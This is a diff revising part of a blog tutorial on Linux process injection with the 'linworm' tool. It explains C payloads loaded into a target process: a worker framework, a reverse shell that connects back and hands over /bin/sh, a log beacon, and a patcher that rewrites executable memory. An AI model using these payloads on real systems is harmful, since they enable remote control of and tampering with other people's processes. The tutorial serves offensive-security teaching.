 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">my_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">payload_running</span>()) {
 </span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ... do work ...
@@ -382,15 +362,30 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p><span style="font-family: Courier, monospace; font-weight: 600;">on_load()</span> runs when <span style="font-family: Courier, monospace; font-weight: 600;">dlopen()</span> finishes mapping the library. It sets up the framework and spawns the worker. The constructor then returns, so the target&rsquo;s main thread can resume. <span style="font-family: Courier, monospace; font-weight: 600;">on_unload()</span> runs if the process exits normally; it tells the worker to stop and waits for it to finish.</p>
-<p><span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span> is what &ldquo;sets up the framework&rdquo; actually means:</p>
+<p>The first function in this example runs automatically when the library is loaded. It prepares and starts the worker, then returns control to the program. The second runs when the program exits. It tells the worker to stop and waits until the worker has finished.</p>
+<p>Before the worker can start, the helper needs a way to receive a stop request and wake the worker if it is waiting. The first step is to create a small channel for that wake-up message:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">payload_init</span>(<span style="color:#66d9ef">void</span>) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pipe</span>(g_pipe_fd) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fcntl</span>(g_pipe_fd[<span style="color:#ae81ff">0</span>], F_SETFL, O_NONBLOCK);
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fcntl</span>(g_pipe_fd[<span style="color:#ae81ff">1</span>], F_SETFL, O_NONBLOCK);
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span>: Creating the Wake-Up Channel
+  
+    <br><br>
+  
+</span>
+<p>One end of the pipe receives the message and the other sends it. Both ends are set so that reading or writing will return immediately instead of making the program wait.</p>
+<p>Next, the helper tells Linux which code should run when <code>SIGUSR2</code> is sent to the process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">payload_init</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sigaction sa;
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>sa, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(sa));
 </span></span><span style="display:flex;"><span>    sa.sa_handler <span style="color:#f92672">=</span> payload_signal_handler;
@@ -403,7 +398,22 @@ succeeded on it.</em></p>
 </span></span><span style="display:flex;"><span>        g_pipe_fd[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> g_pipe_fd[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
+
+
+
+<span class="caption" data-type="listing">
+  <span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span>: Receiving the Stop Request
+  
+    <br><br>
+  
+</span>
+<p>If this setup fails, the helper closes both ends of the pipe and reports the error. If it succeeds, sending <code>SIGUSR2</code> will request a shutdown and write one byte to the pipe, waking the worker immediately.</p>
+<p>The final step saves a reference to the loaded library so that Part 6 can remove it later:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">payload_init</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    Dl_info dl_info;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">dladdr</span>((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)payload_init, <span style="color:#f92672">&amp;</span>dl_info) <span style="color:#f92672">&amp;&amp;</span> dl_info.dli_fname)
 </span></span><span style="display:flex;"><span>        g_self_handle <span style="color:#f92672">=</span> <span style="color:#a6e22e">dlopen</span>(dl_info.dli_fname, RTLD_NOW <span style="color:#f92672">|</span> RTLD_NOLOAD);
@@ -416,18 +426,13 @@ succeeded on it.</em></p>
 
 
 <span class="caption" data-type="listing">
-  <span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span>: Pipe, <code>SIGUSR2</code> Handler, and Self-Handle
+  <span style="font-family: Courier, monospace; font-weight: 600;">payload_init()</span>: Saving the Library Reference
   
     <br><br>
   
 </span>
-<p>Three pieces, each for a different later step:</p>
-<ul>
-<li>A pipe that the sleeping thread can wait on. Writing a byte into it is how shutdown wakes the worker early.</li>
-<li>A <code>SIGUSR2</code> handler, so an operator can ask the payload to stop while the target is still running.</li>
-<li>A <code>RTLD_NOLOAD</code> handle to the payload&rsquo;s own <code>.so</code>. That handle is unused until evacuation; Part 6 covers why it exists.</li>
-</ul>
-<p><span style="font-family: Courier, monospace; font-weight: 600;">payload_start()</span> stores the user function and creates the thread behind a small wrapper. The worker itself is a loop: do work, then sleep, while <span style="font-family: Courier, monospace; font-weight: 600;">payload_running()</span> is true (<code>g_running != 0</code>). A plain <span style="font-family: Courier, monospace; font-weight: 600;">sleep()</span> would ignore shutdown until the timeout expires, so the framework sleeps by polling the pipe instead:</p>
+<p>After this preparation succeeds, the helper starts the worker. Each worker repeats the same basic pattern: perform its task, wait for a while, and check whether it should continue.</p>
+<p>A normal timed wait would not end early when a stop request arrived. Instead, the helper waits for either the chosen amount of time to pass or data to arrive through the wake-up channel:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_sleep_ms</span>(<span style="color:#66d9ef">int</span> ms) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> pollfd pfd <span style="color:#f92672">=</span> {
 </span></span><span style="display:flex;"><span>        .fd <span style="color:#f92672">=</span> g_pipe_fd[<span style="color:#ae81ff">0</span>],
@@ -451,42 +456,13 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>If nobody writes to the pipe, <span style="font-family: Courier, monospace; font-weight: 600;">poll()</span> just waits up to <code>ms</code> milliseconds, like a normal sleep. If shutdown writes a byte, <span style="font-family: Courier, monospace; font-weight: 600;">poll()</span> returns immediately and the loop sees <span style="font-family: Courier, monospace; font-weight: 600;">payload_running()</span> is now false. <span style="font-family: Courier, monospace; font-weight: 600;">write()</span> on a pipe is one of the few operations a signal handler is allowed to use, which is why this pattern (the <em>self-pipe trick</em>) shows up so often in Unix code.</p>
-<p>There are two ways to stop.</p>
-<p>Firstly, when the process exits, the destructor calls <span style="font-family: Courier, monospace; font-weight: 600;">payload_stop()</span>: it clears <code>g_running</code>, writes to the pipe, then <span style="font-family: Courier, monospace; font-weight: 600;">pthread_join()</span>s the worker and closes the pipe.</p>
-<p>Secondly, when the operator sends <code>SIGUSR2</code> instead, the handler does the same wake-up, plus it sets a second flag so the wrapper knows this was not a normal exit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">payload_signal_handler</span>(<span style="color:#66d9ef">int</span> sig) {
-</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">void</span>)sig;
-</span></span><span style="display:flex;"><span>    g_running <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    g_signal_shutdown <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> byte <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">write</span>(g_pipe_fd[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>byte, <span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">payload_thread_wrapper</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">g_user_thread_func</span>(arg);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (g_signal_shutdown <span style="color:#f92672">&amp;&amp;</span> g_self_handle)
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">payload_self_unload</span>();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ret;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><link href="/posts/css/caption.css" rel="stylesheet">
-
-
-
-<span class="caption" data-type="listing">
-  <span style="font-family: Courier, monospace; font-weight: 600;">payload_signal_handler()</span> / <span style="font-family: Courier, monospace; font-weight: 600;">payload_thread_wrapper()</span>: <code>SIGUSR2</code> Handler and The Wrapper That Chooses Cleanup
-  
-    <br><br>
-  
-</span>
-<p>After the user thread returns, <span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span> runs only on the <code>SIGUSR2</code> path. It is how the payload removes its own library from the target. Part 6 will cover that trampoline in detail.</p>
+<p>If there is no stop request, the wait ends when its time runs out and the worker begins its next task. If a stop request arrives, the byte written to the pipe ends the wait immediately. The worker can then leave its loop and clean up without an unnecessary delay.</p>
+<p>This gives the worker two ways to finish: the program can exit, or someone can send <code>SIGUSR2</code> while it is still running. <a href="/posts/linux-processing-injection-guide/part-6-unloading-payload/">Part 6</a> follows both paths through the rest of the shutdown process.</p>
 <h2 id="3-payload-examples">3. Payload Examples</h2>
-<p>The three payloads that ship with <em>linworm</em> all follow the skeleton above. The interesting part is what each thread does inside the loop.</p>
+<p>The three payloads included with <em>linworm</em> all use this worker. The only difference is what each worker does before it waits.</p>
 <h3 id="31-reverse-shell">3.1 Reverse Shell</h3>
-<p><span style="font-family: Courier, monospace; font-weight: 600;">src/payload/reverse_shell.c</span> connects back to the operator and runs an interactive shell over that socket. If the connection drops, it tries again. Host and port come from <code>LINWORM_RHOST</code> and <code>LINWORM_RPORT</code> in the <em>target&rsquo;s</em> environment, defaulting to <code>127.0.0.1:4444</code>, so the same <code>.so</code> can be aimed at different listeners without a rebuild.</p>
-<p>The outer loop is connect-or-retry:</p>
+<p>The reverse shell connects the target to another computer and opens a command shell over that connection. Its destination is read from settings passed to the target program and defaults to <code>127.0.0.1:4444</code>. Changing those settings lets the same library connect somewhere else without being rebuilt.</p>
+<p>The worker begins by trying to make the connection. If the attempt fails, it waits for the configured delay before trying again:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rshell_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">payload_running</span>()) {
@@ -513,7 +489,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>Once the socket is up, the payload forks a child and points the child&rsquo;s stdin, stdout, and stderr at that socket:</p>
+<p>Once connected, the payload starts the shell as a separate process. It sends everything typed over the connection to the shell, then sends the shell&rsquo;s replies back through that same connection:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">rshell_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pid_t</span> child <span style="color:#f92672">=</span> <span style="color:#a6e22e">fork</span>();
@@ -540,10 +516,10 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>The child also closes the self-pipe so it does not keep those file descriptors. The parent then watches the child with non-blocking <span style="font-family: Courier, monospace; font-weight: 600;">waitpid()</span>. If the shell exits, the outer loop reconnects. If <code>SIGUSR2</code> arrives first, the parent sends <code>SIGTERM</code> to the child, waits for it, and closes the socket.</p>
-<p>Let&rsquo;s see this working in action!</p>
+<p>The shell closes its copies of the wake-up channel because only the worker needs them. Meanwhile, the worker keeps checking whether the shell is still running. If the shell ends, the worker returns to the start of the loop and reconnects. If a stop request arrives first, it closes both the shell and the network connection before finishing.</p>
+<p>A quick demonstration:</p>
 <video width=100% controls>
-    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/reverse-shell.mp4" type="video/webm">
+    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/reverse-shell.mp4" type="video/mp4">
     Your browser does not support the video tag.  
 </video>
 <link href="/posts/css/caption.css" rel="stylesheet">
@@ -557,7 +533,7 @@ succeeded on it.</em></p>
   
 </span>
 <h3 id="32-beacon">3.2 Beacon</h3>
-<p><span style="font-family: Courier, monospace; font-weight: 600;">src/payload/beacon.c</span> is the smallest payload: a heartbeat written to <span style="font-family: Courier, monospace; font-weight: 600;">/tmp/linworm_beacon.log</span> every <code>BEACON_INTERVAL_MS</code> (2 seconds).</p>
+<p>The beacon is the simplest example because it does not need a network connection or another process. Every two seconds, its worker adds a heartbeat to <span style="font-family: Courier, monospace; font-weight: 600;">/tmp/linworm_beacon.log</span>:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">beacon_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
 </span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">void</span>)arg;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> counter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
@@ -584,9 +560,9 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>Inject it, tail the log, and you know the library loaded and the worker is alive. Here&rsquo;s a quick demonstration:</p>
+<p>After injecting the library, watch this log as it grows. Each new line confirms that the library loaded successfully and that its worker is still running. The following video shows this in action:</p>
 <video width=100% controls>
-    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/beacon.mp4" type="video/webm">
+    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/beacon.mp4" type="video/mp4">
     Your browser does not support the video tag.  
 </video>
 <link href="/posts/css/caption.css" rel="stylesheet">
@@ -600,7 +576,7 @@ succeeded on it.</em></p>
   
 </span>
 <h3 id="33-patch">3.3 Patch</h3>
-<p><span style="font-family: Courier, monospace; font-weight: 600;">src/payload/patch.c</span> rewrites bytes in the target at compile-time offsets, then puts them back on shutdown. The user-facing config is a module name and a table of patches:</p>
+<p>The memory patcher changes the target itself. Before building the library, you choose the program or library to change, where each change begins, which bytes to write, and which original bytes should be restored later:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define PATCH_TARGET &#34;example_target&#34;
 </span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">patch_entry_t</span> PATCHES[] <span style="color:#f92672">=</span> {
@@ -622,8 +598,8 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p><code>PATCH_TARGET</code> is matched against the path column in <span style="font-family: Courier, monospace; font-weight: 600;">/proc/self/maps</span>. The payload is already inside the target, so &ldquo;self&rdquo; <em>is</em> the target. That can be the main binary (<code>&quot;example_target&quot;</code>) or a library (<code>&quot;libc.so.6&quot;</code>). Each <code>patch_entry_t</code> is an offset from that module&rsquo;s base, the bytes to write, the originals to restore later, and a length.</p>
-<p>Code pages are not writable by default. <span style="font-family: Courier, monospace; font-weight: 600;">apply_patch()</span> flips the page to writable, copies the bytes, then restores execute-only permissions:</p>
+<p>The payload searches <span style="font-family: Courier, monospace; font-weight: 600;">/proc/self/maps</span> for the chosen name. Because the payload is already running inside the target, <code>self</code> refers to the target process. The name can therefore identify either the main program, such as <code>example_target</code>, or one of its loaded libraries, such as <code>libc.so.6</code>. Each entry in the table describes the location and size of a change, as well as the replacement and original bytes.</p>
+<p>Linux normally prevents a program from writing to memory that contains executable code. To make a change, the payload briefly allows writing to the relevant area, copies in the new bytes, and then removes write access again:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">apply_patch</span>(<span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>site, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">uint8_t</span> <span style="color:#f92672">*</span>bytes, <span style="color:#66d9ef">size_t</span> len) {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">set_page_perms</span>(site, PROT_READ <span style="color:#f92672">|</span> PROT_WRITE <span style="color:#f92672">|</span> PROT_EXEC) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
@@ -642,7 +618,7 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>The constructor finds the module, applies every table entry, and only starts the worker if at least one patch stuck. The thread itself just waits. On shutdown it walks the applied sites in reverse and writes <code>orig_bytes</code> back with the same helper:</p>
+<p>When the library loads, it finds the chosen program or library and attempts each change in the table. If at least one succeeds, it starts a worker that waits until shutdown. The changes remain in memory during that time. When the worker is told to stop, it restores the original bytes in reverse order:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">patch_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
 </span></span><span style="display:flex;"><span>    ...
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">payload_running</span>())
@@ -669,9 +645,9 @@ succeeded on it.</em></p>
     <br><br>
   
 </span>
-<p>Here&rsquo;s a quick demonstration:</p>
+<p>A quick demonstration:</p>
 <video width=100% controls>
-    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/patch.mp4" type="video/webm">
+    <source src="/posts/linux-processing-injection-guide/part-5-weaponizing-payloads/videos/patch.mp4" type="video/mp4">
     Your browser does not support the video tag.  
 </video>
 <link href="/posts/css/caption.css" rel="stylesheet">
@@ -685,15 +661,9 @@ succeeded on it.</em></p>
   
 </span>
 <h2 id="4-conclusion">4. Conclusion</h2>
-<p>The framework in <span style="font-family: Courier, monospace; font-weight: 600;">src/payload/common.c</span> is small: a background thread so the target keeps running, a pipe so sleep can be interrupted, and two stop paths: normal exit through the destructor, or <code>SIGUSR2</code> through the wrapper.</p>
-<p>On top of that, the three examples do very different jobs with the same skeleton:</p>
-<ul>
-<li><strong>Reverse shell</strong> &ndash; connect back, spawn <span style="font-family: Courier, monospace; font-weight: 600;">/bin/sh</span>, reconnect if the session dies.</li>
-<li><strong>Beacon</strong> &ndash; a log heartbeat to confirm injection worked.</li>
-<li><strong>Patch</strong> &ndash; rewrite bytes at a module offset, restore them on the way out.</li>
-</ul>
-<p>A new payload is another thread function linked against the same helpers.</p>
-<p><code>SIGUSR2</code> is also the start of evacuation: the wrapper calls <span style="font-family: Courier, monospace; font-weight: 600;">payload_self_unload()</span> instead of returning. Part 6 covers how that trampoline removes the payload&rsquo;s own mapping from the target.</p>
+<p>The shared helper gives every payload a background worker and a way to wake it during shutdown. This lets the target continue running while the payload performs its own work.</p>
+<p>The reverse shell uses the worker to maintain a command session, the beacon uses it to write regular status messages, and the memory patcher uses it to wait until the original bytes should be restored. New payloads can follow the same pattern by supplying a different task for the worker.</p>
+<p><a href="/posts/linux-processing-injection-guide/part-6-unloading-payload/">Part 6</a> explains what happens after a stop request and how <em>linworm</em> safely removes the shared library.</p>
 <h2 id="5-references">5. References</h2>
 <ol>
 <li><a href="https://github.com/mathscantor/linworm">mathscantor/linworm (GitHub)</a></li>
